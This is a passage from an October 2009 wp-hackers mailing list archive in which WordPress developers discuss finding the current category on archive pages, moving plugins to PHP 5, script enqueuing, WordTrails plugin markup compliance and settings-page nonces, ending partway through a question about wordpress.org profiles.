In-Reply-To: <02a401ca4739$a1b6cc20$e5246460$@com>
References: <02a401ca4739$a1b6cc20$e5246460$@com>
Message-ID: <e4dc67e0910070346u64a9c5cfi6244f48c05832bfc@mail.gmail.com>

single_cat_title() ?

W

2009/10/7 Dave Mee <davemee at gmail.com>:
> Hi List!
>
> I know it's possible to pull category names from the post in the loop on
> that page, but I need to find out what definitive category is being
> requested.
>
> For example - invoking site.com/category/cat-b will pull up an archive page.
> However, if the first post in that category is also a member of cat-a, my
> efforts to find a category name are thrown off kilter - the canonical
> category should be coming from the URL, rather than the individual posts.
>
> Is there some mechanism to look into the guts of wordpress or the query and
> discover which category it thinks it's dealing with?
>
> Dave
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From if.website at gmail.com  Wed Oct  7 11:03:27 2009
From: if.website at gmail.com (Austin Matzko)
Date: Wed, 7 Oct 2009 06:03:27 -0500
Subject: [wp-hackers] When archive.php is pulled in the theme,
	how does it know what category it applies to before (or as) the
	loop starts?
In-Reply-To: <02a401ca4739$a1b6cc20$e5246460$@com>
References: <02a401ca4739$a1b6cc20$e5246460$@com>
Message-ID: <674b4a3b0910070403yed43160i216ed114f51423fd@mail.gmail.com>

On Wed, Oct 7, 2009 at 5:33 AM, Dave Mee <davemee at gmail.com> wrote:
> I know it's possible to pull category names from the post in the loop on
> that page, but I need to find out what definitive category is being
> requested.
>
> For example - invoking site.com/category/cat-b will pull up an archive page.
> However, if the first post in that category is also a member of cat-a, my
> efforts to find a category name are thrown off kilter - the canonical
> category should be coming from the URL, rather than the individual posts.
>
> Is there some mechanism to look into the guts of wordpress or the query and
> discover which category it thinks it's dealing with?

Either

$wp_query->get_queried_object()

or

$wp_query->get_queried_object_id()

should help you.

From mike at zed1.com  Wed Oct  7 11:09:02 2009
From: mike at zed1.com (Mike Little)
Date: Wed, 7 Oct 2009 12:09:02 +0100
Subject: [wp-hackers] When archive.php is pulled in the theme,
	how does it know what category it applies to before (or as) the
	loop starts?
In-Reply-To: <02a401ca4739$a1b6cc20$e5246460$@com>
References: <02a401ca4739$a1b6cc20$e5246460$@com>
Message-ID: <7235ce780910070409o4fc6d6cfxea52847ff582dffd@mail.gmail.com>

2009/10/7 Dave Mee <davemee at gmail.com>

> Hi List!
>
> I know it's possible to pull category names from the post in the loop on
> that page, but I need to find out what definitive category is being
> requested.
>
> For example - invoking site.com/category/cat-b will pull up an archive
> page.
> However, if the first post in that category is also a member of cat-a, my
> efforts to find a category name are thrown off kilter - the canonical
> category should be coming from the URL, rather than the individual posts.
>
> Is there some mechanism to look into the guts of wordpress or the query and
> discover which category it thinks it's dealing with?
>
> Dave
>
>
As one respondent mentioned single_cat_title() will get you the name of the
category. If you need the ID, the first line of that function uses
get_query_var():

   $cat = intval( get_query_var('cat') );

 Hope that helps,

Mike
-- 
Mike Little
http://zed1.com/

From davemee at gmail.com  Wed Oct  7 11:15:45 2009
From: davemee at gmail.com (Dave Mee)
Date: Wed, 7 Oct 2009 12:15:45 +0100
Subject: [wp-hackers] When archive.php is pulled in the theme,
	how does it know what category it applies to before (or as)
	the	loop starts?
In-Reply-To: <e4dc67e0910070346u64a9c5cfi6244f48c05832bfc@mail.gmail.com>
References: <02a401ca4739$a1b6cc20$e5246460$@com>
	<e4dc67e0910070346u64a9c5cfi6244f48c05832bfc@mail.gmail.com>
Message-ID: <02b201ca473f$8434b940$8c9e2bc0$@com>

William, you're absolutely right. You star.

I attached your cigar to this post, hope it doesn't get scraped by the
mailman.

Dave

> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-
> bounces at lists.automattic.com] On Behalf Of William Canino
> Sent: 07 October 2009 11:47
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] When archive.php is pulled in the theme, how
> does it know what category it applies to before (or as) the loop
> starts?
> 
> single_cat_title() ?
> 
> W
> 
> 2009/10/7 Dave Mee <davemee at gmail.com>:
> > Hi List!
> >
> > I know it's possible to pull category names from the post in the loop
> on
> > that page, but I need to find out what definitive category is being
> > requested.
> >
> > For example - invoking site.com/category/cat-b will pull up an
> archive page.
> > However, if the first post in that category is also a member of cat-
> a, my
> > efforts to find a category name are thrown off kilter - the canonical
> > category should be coming from the URL, rather than the individual
> posts.
> >
> > Is there some mechanism to look into the guts of wordpress or the
> query and
> > discover which category it thinks it's dealing with?
> >
> > Dave
> >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From public at toppa.com  Wed Oct  7 11:55:22 2009
From: public at toppa.com (Michael Toppa)
Date: Wed, 07 Oct 2009 07:55:22 -0400
Subject: [wp-hackers] looking for opinions on php5-only plugins
In-Reply-To: <mailman.4029.1254913764.16651.wp-hackers@lists.automattic.com>
References: <mailman.4029.1254913764.16651.wp-hackers@lists.automattic.com>
Message-ID: <4ACC81AA.1010300@toppa.com>

Hi all,

I'm contemplating doing my future plugin work in PHP5, and I'd like to 
hear from others about this. I am a thorough-going OO programmer, and in 
my day job I've been programming in PHP 5 for years now. Switching back 
to the primitive OO features in PHP4 is always a mind-numbing 
experience. While the rule is that user support is more important than 
developer convenience, at what point must that give way to the fact that 
PHP4 hit its official end of life over a year ago? No more bug fixes, no 
more security fixes - if I were a hosting provider I'd feel awfully 
exposed if I hadn't upgraded by now. As for me, doing hours of new 
development work in an officially unsupported version of a language 
isn't exactly inspiring.
 
According to the Codex, "PHP 5 only features may be introduced in 
WordPress 3.0" - http://codex.wordpress.org/Switching_to_PHP5

So my specific questions are:

* Are there any current numbers out there on PHP5 adoption rates, 
especially among the hosting providers for WordPress users? All the 
general php5 adoption rate numbers I found online are from years ago and 
are out of date. Having a sense of how many users I might be leaving in 
the cold will be the key factor in my decision.

* Is there any sense of when WordPress 3.0 is coming? It would be 
helpful to know if my switching to PHP 5 for my plugins would put me 
ahead of WordPress itself in a timespan measured in months, vs. a 
timespan of years.

Thanks!

Mike T
http://www.toppa.com




From info at toscho.de  Wed Oct  7 13:24:17 2009
From: info at toscho.de (Thomas Scholz)
Date: Wed, 07 Oct 2009 15:24:17 +0200
Subject: [wp-hackers] looking for opinions on php5-only plugins
In-Reply-To: <4ACC81AA.1010300@toppa.com>
References: <mailman.4029.1254913764.16651.wp-hackers@lists.automattic.com>
	<4ACC81AA.1010300@toppa.com>
Message-ID: <op.u1fl6rhfr6yny2@toscho.de>

Michael Toppa,

> * Is there any sense of when WordPress 3.0 is coming?

2010: http://wordpress.org/about/roadmap/

I don?t care about PHP 4 since 2006. If you add your plugin to the plugin  
directory you should mention it. More work on this is a waste of time in  
my opinion.

Thomas

-- 
Redaktion, Druck- und Webdesign
http://toscho.de ? 0160/1764727
Twitter: @toscho

From aaron at xavisys.com  Wed Oct  7 13:28:25 2009
From: aaron at xavisys.com (Aaron D. Campbell)
Date: Wed, 07 Oct 2009 06:28:25 -0700
Subject: [wp-hackers] looking for opinions on php5-only plugins
In-Reply-To: <4ACC81AA.1010300@toppa.com>
References: <mailman.4029.1254913764.16651.wp-hackers@lists.automattic.com>
	<4ACC81AA.1010300@toppa.com>
Message-ID: <4ACC9779.5050500@xavisys.com>

According to the guys at Automattic, roughly 85% of WordPress installs 
run on PHP 5+.  The idea is to start introducing PHP 5 features and see 
if they can increase that percentage before actually requiring PHP 5.  
However, they currently encourage plugin authors to use PHP 5, which 
will hopefully help push that percentage up as well.

As someone that uses PHP 5 in my plugins, I can say that you need to 
make sure that you state "PHP 5 Required" in as many places as you can.  
In my experience, you will get people that say your plugin doesn't work, 
but usually you can just tell them that it requires PHP 5 and that they 
can talk to their host to switch.  I've noticed that I haven't had a 
single person recently (last 6 months) who was told by their host that 
they didn't offer PHP 5.

As for when 3.0 will be here, there's no exact date set yet (that I know 
of).  I'd estimate that it'll be here in about 6 - 8 months (2.9 isn't 
that far from Beta then RC).  Maybe someone from Automattic could chime 
in with more exact numbers, but that's what I've picked up in the 
developer chats.

Michael Toppa wrote:
> So my specific questions are:
>
> * Are there any current numbers out there on PHP5 adoption rates, 
> especially among the hosting providers for WordPress users? All the 
> general php5 adoption rate numbers I found online are from years ago 
> and are out of date. Having a sense of how many users I might be 
> leaving in the cold will be the key factor in my decision.
>
> * Is there any sense of when WordPress 3.0 is coming? It would be 
> helpful to know if my switching to PHP 5 for my plugins would put me 
> ahead of WordPress itself in a timespan measured in months, vs. a 
> timespan of years.

From sharon at BrewerRadio.com  Wed Oct  7 14:05:00 2009
From: sharon at BrewerRadio.com (Sharon Chambers)
Date: Wed, 07 Oct 2009 10:05:00 -0400
Subject: [wp-hackers] looking for opinions on php5-only plugins
Message-ID: <4b4aeb0c.1ca4757.193daeeb.6c46@BrewerRadio.com>

-----Original Message-----
* Are there any current numbers out there on PHP5 adoption rates, 
especially among the hosting providers for WordPress users? All the 
general php5 adoption rate numbers I found online are from years ago and 
are out of date. Having a sense of how many users I might be leaving in 
the cold will be the key factor in my decision.



IMHO, PHP5 would be the way to go.  I've developed dozens of websites in the past few years, all with PHP5 support, and have installed, written, and successfully used PHP5 plugins.  However, I'm not really sympathetic to users who refuse to upgrade, and have stopped supporting IE 6 in my own development for just such reasons.

I should note that I use GoDaddy almost exclusively for hosting, and they do still offer PHP4 installs, though I always use PHP5.

-that's my $.02
Sharon 


From otto at ottodestruct.com  Wed Oct  7 14:45:16 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 7 Oct 2009 09:45:16 -0500
Subject: [wp-hackers] looking for opinions on php5-only plugins
In-Reply-To: <4ACC81AA.1010300@toppa.com>
References: <mailman.4029.1254913764.16651.wp-hackers@lists.automattic.com> 
	<4ACC81AA.1010300@toppa.com>
Message-ID: <161617690910070745n278304b1ld1a4e767335c0b92@mail.gmail.com>

I don't bother trying to support anything below PHP 5 anymore.

I have example code in the Automatic Timezone plugin (
http://wordpress.org/extend/plugins/automatic-timezone/ ) which
demonstrates how to prevent a plugin from being activated.

Using this method, you could make your plugin check for the necessary
support (like PHP 5, or whatever), and pop a message back to the user
when they try to activate it on a PHP 4 setup.


-Otto
Sent from Memphis, TN, United States

From jer at simianuprising.com  Wed Oct  7 14:52:31 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Wed, 7 Oct 2009 10:52:31 -0400
Subject: [wp-hackers] looking for opinions on php5-only plugins
In-Reply-To: <4b4aeb0c.1ca4757.193daeeb.6c46@BrewerRadio.com>
References: <4b4aeb0c.1ca4757.193daeeb.6c46@BrewerRadio.com>
Message-ID: <e1202cb10910070752y220b7075hc502a027b676b5fb@mail.gmail.com>

On Wed, Oct 7, 2009 at 10:05 AM, Sharon Chambers <sharon at brewerradio.com> wrote:
> -----Original Message-----
> * Are there any current numbers out there on PHP5 adoption rates,
> especially among the hosting providers for WordPress users? All the
> general php5 adoption rate numbers I found online are from years ago and
> are out of date. Having a sense of how many users I might be leaving in
> the cold will be the key factor in my decision.

This came up recently but just to have it mentioned in this thread
also: Remember that not all PHP 5's are created equal. There are a lot
of functions/features added in PHP 5.2 that are very useful but not
available to a lot of the people using PHP 5.

Specifically, CentOS/RHEL is sticking with 5.1.x currently, and the
process of upgrading to PHP 5.2.x is complicated enough that even
reasonably knowledgeable sysadmins could get stymied (installing new
repos, futzing with repo priorities, risking using the 'testing'
repo). I bet that a lot of the hosts that provide PHP 5 wouldn't even
know about or would be unwilling to make the upgrade to 5.2.x.

ALSO: I noticed it 'cause of a few Drupal modules that needed it
(blegh). Drupal has an elaborate system for specifying in your module
metadata what version of PHP is required and showing errors if your
version isn't high enough. IMHO this isn't even a particularly good
system, as it turns out some of the modules actually list higher
requirements than they require, simply because the maintainer didn't
feel like testing it on older PHP versions and just listed the version
they use (forums tell you to 'fix' it by just changing the hardcoded
requirements in the module file!).

I think the best solution is to note any functionality that is version
specific and show useful errors (with links to 'how to get your server
upgraded by your host' articles in the codex or whatever) to people
who are missing functionality, just like you should for apache/PHP
modules that a server might be missing.

-- 
Jeremy Clarke | http://jeremyclarke.org
Code and Design | http://globalvoicesonline.org

From ajd at cloudiness.com  Wed Oct  7 15:17:56 2009
From: ajd at cloudiness.com (Art Delano)
Date: Wed, 7 Oct 2009 11:17:56 -0400
Subject: [wp-hackers] wp_enqueue_script interCapping gotcha
Message-ID: <4E9A9125-1893-4972-BEC4-0681EA576A25@cloudiness.com>

wp_enqueue_script got me again this morning. I couldn't figure out why  
the following didn't work:

function jquerykicker() {
    $asdf = WP_CONTENT_URL.'/themes/mytheme/scripts/display.js';
    wp_enqueue_script('launchAll',$asdf,array('jquery'),'',TRUE);
}
add_action('template_redirect','jquerykicker');

The problem was "launchAll" - wp_enqueue_script will only accept  
lowercase strings for the handle. Changing it to "launchall" (without  
editing the display.js file) fixed everything.

Is there a reason for this constraint? There's no harm to my scripts  
to keep the string lowercased, but I feel like it wastes a lot of time  
to repeatedly debug sites that aren't working because I forgot to  
lowercase a string.

Art

From Jesse.Silverstein at XEROX.COM  Wed Oct  7 15:24:20 2009
From: Jesse.Silverstein at XEROX.COM (Silverstein, Jesse)
Date: Wed, 7 Oct 2009 08:24:20 -0700
Subject: [wp-hackers] [OT] Testing needed for WordTrails plugin fromXerox
In-Reply-To: <e4dc67e0910041121v832daeeva5258bbf4a3955a5@mail.gmail.com>
References: <ce5c284a0910040918u7cc9a80eic668d1010916b896@mail.gmail.com><349fe48b0910041019s26a7c61cq6d513450a9088e74@mail.gmail.com><523D3234-ABE5-4A92-88B1-8776611E7F7A@striderweb.com>
	<e4dc67e0910041121v832daeeva5258bbf4a3955a5@mail.gmail.com>
Message-ID: <42DF740CBF5256498541B6CA6DB6E56D04FCC9DA@USA7061MS03.na.xerox.net>

Working up a php snippet to add trail following to post templates is on our to-do list for a near-future version. We realize that not everyone has sidebars, or wants to use them for trail following. However, if someone hacks it out for us, it may get added sooner, so everyone can benefit :) If you're interested in pulling the information, check out the WordTrailsWidget class for details on how to access the data.

The issue of XHTML compliance is a tricky one. The plugin was developed with XHTML compliance in mind, but we have slipped in a few places. I will be addressing the easy-to-solve issues in the next version of the plugin. However, the sidebar widget and trail index use divs with border-radius CSS, which is not css2 compatible. I think we would like to keep the rounded corners, but in doing so, we may be dropping the possibility of compliance. That said, once we fix the rest of the compliance breaks, it would be easy to rip out all of the border-radius entries in our css files (conveniently located in a css folder).

I supposed another option would be to separate out all of the non-compliant css into files that are only included based on settings in the plugin. That way, people who don't mind the css compliance break can get the pretty divs, and people that need compliance can get it.

Thanks for the feedback so far. Keep it coming!

-Jesse

Jesse.Silverstein at xerox.com
Xerox Trails team
Xerox Research Center, Webster

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of William Canino
Sent: Sunday, October 04, 2009 2:22 PM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] [OT] Testing needed for WordTrails plugin fromXerox

> I agree it could be better marked.  I hope there is a way to put those links
> at the bottom of each article instead of in the sidebar....
>
> Stephen

Exactly what I said and exactly the first mod I will do to this plugin.

I cannot presume that my readers have 27-inch monitors.

W


2009/10/4 Stephen Rider <wp-hackers at striderweb.com>:
>
> On Oct 4, 2009, at 12:19 PM, scribu wrote:
>
>> I like the ideea of trails, but I can't figure out how to view one.
>>
>> I can't get past the Bird's eye view here:
>> http://blog.trailmeme.com/trails/?t=2bffff2a-efe8-102c-b39a-12313a00c9d2
>
> Look for the "Word Trails" sidebar on the right side.
> <http://blog.trailmeme.com/2009/09/about-trails/?t=8>
>
> I agree it could be better marked. ?I hope there is a way to put those links
> at the bottom of each article instead of in the sidebar....
>
> Stephen
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From ajd at cloudiness.com  Wed Oct  7 15:25:19 2009
From: ajd at cloudiness.com (Art Delano)
Date: Wed, 7 Oct 2009 11:25:19 -0400
Subject: [wp-hackers] wp_enqueue_script interCapping gotcha
In-Reply-To: <4E9A9125-1893-4972-BEC4-0681EA576A25@cloudiness.com>
References: <4E9A9125-1893-4972-BEC4-0681EA576A25@cloudiness.com>
Message-ID: <C7C98925-D252-496B-81FE-2C2FBAD7138C@cloudiness.com>

Ignore the below: It was actually a typo I'd made that prevented  
wp_footer() from loading in theme. And it looks like intercapping is  
now permissible in wp_enqueue_script handles as well.

I had hoped my first post to this list wouldn't involve shooting  
myself in the foot. Sorry, everybody.

Art

On Oct 7, 2009, at 11:17 AM, Art Delano wrote:

> wp_enqueue_script got me again this morning. I couldn't figure out  
> why the following didn't work:
>
> function jquerykicker() {
>   $asdf = WP_CONTENT_URL.'/themes/mytheme/scripts/display.js';
>   wp_enqueue_script('launchAll',$asdf,array('jquery'),'',TRUE);
> }
> add_action('template_redirect','jquerykicker');
>
> The problem was "launchAll" - wp_enqueue_script will only accept  
> lowercase strings for the handle. Changing it to  
> "launchall" (without editing the display.js file) fixed everything.
>
> Is there a reason for this constraint? There's no harm to my scripts  
> to keep the string lowercased, but I feel like it wastes a lot of  
> time to repeatedly debug sites that aren't working because I forgot  
> to lowercase a string.
>
> Art
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From scribu at gmail.com  Wed Oct  7 16:44:54 2009
From: scribu at gmail.com (scribu)
Date: Wed, 7 Oct 2009 19:44:54 +0300
Subject: [wp-hackers] looking for opinions on php5-only plugins
In-Reply-To: <e1202cb10910070752y220b7075hc502a027b676b5fb@mail.gmail.com>
References: <4b4aeb0c.1ca4757.193daeeb.6c46@BrewerRadio.com>
	<e1202cb10910070752y220b7075hc502a027b676b5fb@mail.gmail.com>
Message-ID: <349fe48b0910070944n63a6e603ob6e697dc8c965da@mail.gmail.com>

I dropped support for PHP4 early on.

I still get comments from people getting parser errors, even though they
"are running PHP5". The thing is that their admin panel is saying PHP5, but
the environment is PHP4. I hate hosts that do that!

I tell them to do a var_dump(PHP_VERSION); and they are surprised to find
out that it's 4.*.


-- 
http://scribu.net

From pl at fusi0n.org  Wed Oct  7 16:45:54 2009
From: pl at fusi0n.org (Pier-Luc Petitclerc)
Date: Wed, 7 Oct 2009 12:45:54 -0400
Subject: [wp-hackers] Adding custom options to default setting pages
In-Reply-To: <9b6c20460910030106l17a0bd1cua9a15e987393d8c3@mail.gmail.com>
References: <9e9ddf9d0910022051x5b009432lad3d3ebce00aa817@mail.gmail.com>
	<1fa535a70910022129x3311f7dfwccbb5786ab9afc94@mail.gmail.com>
	<9e9ddf9d0910022225y158634b0r5c4f40d5547a36c4@mail.gmail.com>
	<9b6c20460910030106l17a0bd1cua9a15e987393d8c3@mail.gmail.com>
Message-ID: <9e9ddf9d0910070945x718c3edatb67b32d7536a40e4@mail.gmail.com>

If I don't include register_settings the nonce is not recreated and the
opposite behavior happens - the default media options will save but the
third-party ones will not.

On Sat, Oct 3, 2009 at 4:06 AM, Milan Dini? <liste at srpski.biz> wrote:

> But why you need _wpnonce if you use register_setting? Isn't point of that
> function that you don't need to deal with nonces, referer and other
> security
> data?
>
> See
>
> http://planetozh.com/blog/2009/05/handling-plugins-options-in-wordpress-28-with-register_setting/#more-1241
> .
>
> 2009/10/3 Pier-Luc Petitclerc <pl at fusi0n.org>
>
> > WP-prettyPhoto PHP Source: http://pastebin.ca/1590213
> > HTML Source of Media Settings Page: http://pastebin.ca/1590214
> >
> > On Sat, Oct 3, 2009 at 12:29 AM, John Blackbourn
> > <johnbillion+wp at gmail.com <johnbillion%2Bwp at gmail.com> <
> johnbillion%2Bwp at gmail.com <johnbillion%252Bwp at gmail.com>><
> > johnbillion%2Bwp at gmail.com <johnbillion%252Bwp at gmail.com> <
> johnbillion%252Bwp at gmail.com <johnbillion%25252Bwp at gmail.com>>>
> > > wrote:
> >
> > > Hi Peir-Luc,
> > >
> > > Attachments to the list get removed. Try pastebin.ca or upload the
> > > code and send us a link.
> > >
> > > John
> > >
> > > 2009/10/3 Pier-Luc Petitclerc <pl at fusi0n.org>:
> > > > Hey wp-hackers.
> > > >
> > > > I have a question for you regarding the Settings API. See, I decided
> > that
> > > my
> > > > plugin, WP-prettyPhoto, shouldn't have an options page on its own,
> > since
> > > > it's proper to put inside an already existing section (Settings >
> > Media).
> > > My
> > > > problem with that idea is that I have no choice but to overwrite the
> > > > _wpnonce field using settings_field(). Doing that in an default
> section
> > > > makes it so that my custom options will process and save, but the
> > default
> > > > ones will not. I've attached the plugin code as well as the Media
> > > Settings
> > > > page source so that you can get an idea. What am I doing wrong?
> > > >
> > > > --
> > > > - pL
> > > >
> > > > _______________________________________________
> > > > wp-hackers mailing list
> > > > wp-hackers at lists.automattic.com
> > > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > > >
> > > >
> > > _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >
> >
> >
> >
> > --
> > - pL
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
- pL

From info at toscho.de  Wed Oct  7 17:41:21 2009
From: info at toscho.de (Thomas Scholz)
Date: Wed, 07 Oct 2009 19:41:21 +0200
Subject: [wp-hackers] looking for opinions on php5-only plugins
In-Reply-To: <161617690910070745n278304b1ld1a4e767335c0b92@mail.gmail.com>
References: <mailman.4029.1254913764.16651.wp-hackers@lists.automattic.com>
	<4ACC81AA.1010300@toppa.com>
	<161617690910070745n278304b1ld1a4e767335c0b92@mail.gmail.com>
Message-ID: <op.u1fx27gnr6yny2@toscho.de>

Otto:

> I have example code in the Automatic Timezone plugin (
> http://wordpress.org/extend/plugins/automatic-timezone/ ) which
> demonstrates how to prevent a plugin from being activated.

I?ll steal this. :)

> Using this method, you could make your plugin check for the necessary
> support (like PHP 5, or whatever), and pop a message back to the user
> when they try to activate it on a PHP 4 setup.

It would be nice to automate this. Maybe two new fields for plugin headers?

Example for a plugin that requires at least PHP 5.2, bzip2, imagick and  
iconv or mbstring:
/*
Plugin Name: example
Plugin URI: http://example.com/
Description: Bla
Version: 0.2
Author: Somebody
PHP Version: 5.2
PHP Extensions: bzip2, (iconv|mbstring), imagick
*/

This would help to sort out plugins in the repository, and the error  
messages could be unified and translated by the I18n people.

Thomas

-- 
Redaktion, Druck- und Webdesign
http://toscho.de ? 0160/1764727
Twitter: @toscho

From otto at ottodestruct.com  Wed Oct  7 17:49:50 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 7 Oct 2009 12:49:50 -0500
Subject: [wp-hackers] looking for opinions on php5-only plugins
In-Reply-To: <op.u1fx27gnr6yny2@toscho.de>
References: <mailman.4029.1254913764.16651.wp-hackers@lists.automattic.com> 
	<4ACC81AA.1010300@toppa.com>
	<161617690910070745n278304b1ld1a4e767335c0b92@mail.gmail.com> 
	<op.u1fx27gnr6yny2@toscho.de>
Message-ID: <161617690910071049v1fbd2177re423813107ecd28a@mail.gmail.com>

Version number checking is a bad idea. It's simply not accurate enough
and doesn't tell you what you need to know.

Checking for extensions, or functions provided by extensions (using
function_exists or class_exists, etc) is much more accurate and sure
to work. That's what I check for in the activation checks, whenever a
plugin depends on something that somebody might not have.

-Otto
Sent from Memphis, TN, United States


On Wed, Oct 7, 2009 at 12:41 PM, Thomas Scholz <info at toscho.de> wrote:
> Otto:
>
>> I have example code in the Automatic Timezone plugin (
>> http://wordpress.org/extend/plugins/automatic-timezone/ ) which
>> demonstrates how to prevent a plugin from being activated.
>
> I?ll steal this. :)
>
>> Using this method, you could make your plugin check for the necessary
>> support (like PHP 5, or whatever), and pop a message back to the user
>> when they try to activate it on a PHP 4 setup.
>
> It would be nice to automate this. Maybe two new fields for plugin headers?
>
> Example for a plugin that requires at least PHP 5.2, bzip2, imagick and
> iconv or mbstring:
> /*
> Plugin Name: example
> Plugin URI: http://example.com/
> Description: Bla
> Version: 0.2
> Author: Somebody
> PHP Version: 5.2
> PHP Extensions: bzip2, (iconv|mbstring), imagick
> */
>
> This would help to sort out plugins in the repository, and the error
> messages could be unified and translated by the I18n people.
>
> Thomas
>
> --
> Redaktion, Druck- und Webdesign
> http://toscho.de ? 0160/1764727
> Twitter: @toscho
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From william.canino at googlemail.com  Wed Oct  7 18:18:08 2009
From: william.canino at googlemail.com (William Canino)
Date: Wed, 7 Oct 2009 14:18:08 -0400
Subject: [wp-hackers] [OT] Testing needed for WordTrails plugin fromXerox
In-Reply-To: <42DF740CBF5256498541B6CA6DB6E56D04FCC9DA@USA7061MS03.na.xerox.net>
References: <ce5c284a0910040918u7cc9a80eic668d1010916b896@mail.gmail.com>
	<349fe48b0910041019s26a7c61cq6d513450a9088e74@mail.gmail.com>
	<523D3234-ABE5-4A92-88B1-8776611E7F7A@striderweb.com>
	<e4dc67e0910041121v832daeeva5258bbf4a3955a5@mail.gmail.com>
	<42DF740CBF5256498541B6CA6DB6E56D04FCC9DA@USA7061MS03.na.xerox.net>
Message-ID: <e4dc67e0910071118vf0f2787lf3936d157c92682c@mail.gmail.com>

Hello Jesse:

> issues in the next version of the plugin. However, the sidebar widget and trail index use divs
> with border-radius CSS, which is not css2 compatible. I think we would like to keep the

I get the impression you are referring to the CSS2 non-compliance,
whereas I meant XHTML non-compliance, such as

* the "info" tag for your convenience so that your jquery code can
pick up what appears on the fancy hovering callout boxes that screen
readers and mobile browsers cannot see anyway.  (I'd have used "title"
instead, if it were my code.)
* & instead of &amp; in urls in hrefs
* div tags inside a tags
* empty optgroups
* ask an xhtml validator for the rest.

> I supposed another option would be to separate out all of the non-compliant css into files that
> are only included based on settings in the plugin. That way, people who don't mind the css
> compliance break can get the pretty divs, and people that need compliance can get it.

This is one way to do this, but then you get more network fetches,
more source code and possibly an extra get_option at runtime. Instead,
I suggest shipping two versions of the css files, with the same
filename. Site admins who need XHTML compliance can plunk the second
one in the first one's place.  It's extra work for the plugin author
maintaining two versions of files, though.

Nonetheless, I believe that people who need compliance are already
using their own CSS and will never use the CSS you ship as-is.

I can hack the patches for the CSS and typos; For the info tag, read
http://stackoverflow.com/questions/883599/on-jquery-metadata-and-xhtml-compliance
.


2009/10/7 Silverstein, Jesse <Jesse.Silverstein at xerox.com>:
> Working up a php snippet to add trail following to post templates is on our to-do list for a near-future version. We realize that not everyone has sidebars, or wants to use them for trail following. However, if someone hacks it out for us, it may get added sooner, so everyone can benefit :) If you're interested in pulling the information, check out the WordTrailsWidget class for details on how to access the data.
>
> The issue of XHTML compliance is a tricky one. The plugin was developed with XHTML compliance in mind, but we have slipped in a few places. I will be addressing the easy-to-solve issues in the next version of the plugin. However, the sidebar widget and trail index use divs with border-radius CSS, which is not css2 compatible. I think we would like to keep the rounded corners, but in doing so, we may be dropping the possibility of compliance. That said, once we fix the rest of the compliance breaks, it would be easy to rip out all of the border-radius entries in our css files (conveniently located in a css folder).
>
> I supposed another option would be to separate out all of the non-compliant css into files that are only included based on settings in the plugin. That way, people who don't mind the css compliance break can get the pretty divs, and people that need compliance can get it.
>
> Thanks for the feedback so far. Keep it coming!
>
> -Jesse
>
> Jesse.Silverstein at xerox.com
> Xerox Trails team
> Xerox Research Center, Webster
>
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of William Canino
> Sent: Sunday, October 04, 2009 2:22 PM
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] [OT] Testing needed for WordTrails plugin fromXerox
>
>> I agree it could be better marked. ?I hope there is a way to put those links
>> at the bottom of each article instead of in the sidebar....
>>
>> Stephen
>
> Exactly what I said and exactly the first mod I will do to this plugin.
>
> I cannot presume that my readers have 27-inch monitors.
>
> W
>
>
> 2009/10/4 Stephen Rider <wp-hackers at striderweb.com>:
>>
>> On Oct 4, 2009, at 12:19 PM, scribu wrote:
>>
>>> I like the ideea of trails, but I can't figure out how to view one.
>>>
>>> I can't get past the Bird's eye view here:
>>> http://blog.trailmeme.com/trails/?t=2bffff2a-efe8-102c-b39a-12313a00c9d2
>>
>> Look for the "Word Trails" sidebar on the right side.
>> <http://blog.trailmeme.com/2009/09/about-trails/?t=8>
>>
>> I agree it could be better marked. ?I hope there is a way to put those links
>> at the bottom of each article instead of in the sidebar....
>>
>> Stephen
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From eckman.john at gmail.com  Wed Oct  7 19:02:31 2009
From: eckman.john at gmail.com (John Eckman)
Date: Wed, 7 Oct 2009 15:02:31 -0400
Subject: [wp-hackers] Profile madness
Message-ID: <6225FB64-5576-4B72-9204-366AF6D1F6E5@gmail.com>

Sorry if this is a RTFM - feel free to point me there if it is.

I feel like I've got proliferating profiles on *.wordpress.org/*

Here's what I know so far (I worry there might be others!):

	http://wordpress.org/extend/plugins/profile/johneckman

and

